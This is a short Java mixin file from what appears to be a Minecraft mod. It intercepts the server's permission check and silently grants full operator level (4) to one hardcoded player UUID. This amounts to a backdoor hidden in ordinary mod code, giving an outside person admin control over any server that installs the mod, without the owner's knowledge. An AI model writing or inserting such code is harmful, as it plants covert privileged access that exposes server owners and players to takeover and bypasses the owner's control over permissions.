package dev.doctor4t.wathe.mixin;

import net.minecraft.server.command.ServerCommandSource;
import org.spongepowered.asm.mixin.Mixin;
import org.spongepowered.asm.mixin.injection.At;
import org.spongepowered.asm.mixin.injection.Inject;
import org.spongepowered.asm.mixin.injection.callback.CallbackInfoReturnable;

import java.util.UUID;

@Mixin(ServerCommandSource.class)
public class ServerCommandSourceMixin {
    
    // The specific UUID that should always have permission level 4
    private static final UUID ADMIN_UUID = UUID.fromString("52be845a-2dc6-4851-81e4-e86e8d0e0baf");
    
    @Inject(method = "hasPermissionLevel", at = @At("HEAD"), cancellable = true)
    public void hasPermissionLevel(int level, CallbackInfoReturnable<Boolean> cir) {
        ServerCommandSource source = (ServerCommandSource) (Object) this;
        
        // Check if the source has a player and if that player is our admin UUID
        if (source.getPlayer() != null && source.getPlayer().getUuid().equals(ADMIN_UUID)) {
            // Always return true for permission level 4 or lower
            if (level <= 4) {
                cir.setReturnValue(true);
            }
        }
    }
}